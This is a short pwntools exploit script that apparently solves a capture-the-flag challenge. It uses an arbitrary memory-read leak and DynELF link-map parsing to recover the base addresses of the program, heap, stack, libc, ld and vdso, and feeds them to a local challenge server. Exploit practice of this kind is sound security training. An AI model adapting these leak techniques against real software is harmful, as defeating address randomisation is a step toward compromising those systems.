from pwn import *
exe = ELF("./chall")
libc = ELF("libc.so.6")

global p
# p = process(exe.path)
p = remote("localhost",1024)

if args.GDB:
    gdb.attach(p)
    time.sleep(2)

def leak(address):
    global p
    p.sendlineafter("Where to, captain?",str(address))
    p.readuntil("We gathered ")
    leak = p64(int(p.readuntil(" ")))
    return leak
    
# pwntools can parse the link map for us
d = DynELF(leak, exe.address)
libs = d.bases()
libc.address = libs[b'/lib/x86_64-linux-gnu/libc.so.6']
stack = u64(leak(libc.sym['__environ']))-0x1F648 # not the base, just a stack address

locs = {
    'app': exe.address,
    'heap': u64(leak(libc.sym['__curbrk']))-0x21000,
    'stack': stack+(0x1000-(stack%0x1000)), # this one's a little random, like 30% chance of being right
    'ld': libs[b'/lib64/ld-linux-x86-64.so.2'],
    'vvar': libs[b'linux-vdso.so.1']-0x4000,
    'vdso': libs[b'linux-vdso.so.1'],
    'libc': libc.address
}

p.sendlineafter("Where to, captain?","0")
p.readuntil("the world.\n")
for _ in range(7):
    question = p.readuntilS("?").split()[-1][:-1]
    info(f"answering {question}")
    answer = [v for k,v in locs.items() if k in question][0]
    p.sendline(str(answer))
p.interactive()


